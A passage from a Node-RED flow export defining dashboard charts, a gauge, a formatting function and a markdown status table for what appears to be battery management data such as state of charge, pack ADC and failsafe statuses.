        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 820,
        "y": 1360,
        "wires": [
            []
        ]
    },
    {
        "id": "fead31dbb0d6315c",
        "type": "function",
        "z": "f794ff764964069d",
        "name": "Extract Adaptive State of Charge",
        "func": "var sigFigs = 2;\n\nvar adaptive_state_of_charge =\n{\n    topic: \"Adaptive State of Charge\",\n    payload: msg.payload.adaptive_state_of_charge\n}\ntry {\n    adaptive_state_of_charge.payload = adaptive_state_of_charge.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    adaptive_state_of_charge\n]",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 870,
        "y": 1420,
        "wires": [
            [
                "d7dfcfee5a6f4b87"
            ]
        ]
    },
    {
        "id": "d7dfcfee5a6f4b87",
        "type": "ui-gauge",
        "z": "f794ff764964069d",
        "name": "Adaptive State of Charge",
        "group": "43f27ebf639a5e84",
        "order": 3,
        "width": 3,
        "height": "4",
        "gtype": "gauge-half",
        "gstyle": "needle",
        "title": "Adaptive State of Charge",
        "units": "%",
        "icon": "",
        "prefix": "",
        "suffix": "",
        "segments": [
            {
                "from": "0",
                "color": "#000000"
            }
        ],
        "min": 0,
        "max": "100",
        "sizeThickness": 16,
        "sizeGap": 4,
        "sizeKeyThickness": 8,
        "styleRounded": true,
        "styleGlow": false,
        "className": "",
        "x": 1190,
        "y": 1420,
        "wires": []
    },
    {
        "id": "c0755f802dbe56ad",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "43f27ebf639a5e84",
        "name": "Rolling Counter",
        "label": "Rolling Counter",
        "order": 6,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "Rolling_Counter",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 820,
        "y": 1500,
        "wires": [
            []
        ]
    },
    {
        "id": "9869414c19beb90b",
        "type": "ui-chart",
        "z": "f794ff764964069d",
        "group": "43f27ebf639a5e84",
        "name": "Total Pack ADC",
        "label": "Total Pack ADC",
        "order": 7,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "total_pack_adc",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 820,
        "y": 1560,
        "wires": [
            []
        ]
    },
    {
        "id": "e7aac4a1f48965fc",
        "type": "ui-markdown",
        "z": "f794ff764964069d",
        "group": "43f27ebf639a5e84",
        "name": "",
        "order": 1,
        "width": "6",
        "height": "4",
        "content": "| Name | Value |\n| - | - |\n| Adaptive Total Capacity | {{msg?.payload.adaptive_total_capacity || 'Unknown' }} |\n| FAILSAFE STATUS | {{msg?.payload.failsafe_statuses || 'Unknown' }} |\n| BMS FAILSAFE STATUS | {{msg?.payload.BMS_FailsafeStatuses || 'Unknown' }} |\n| Low Cell Voltage ID | {{msg?.payload.Low_Cell_Voltage_ID || 'Unknown' }} |\n| High Cell Voltage ID | {{msg?.payload.High_Cell_Voltage_ID || 'Unknown' }} |",
        "className": "",
        "x": 810,
        "y": 1200,
        "wires": [
            []
        ]
    }
]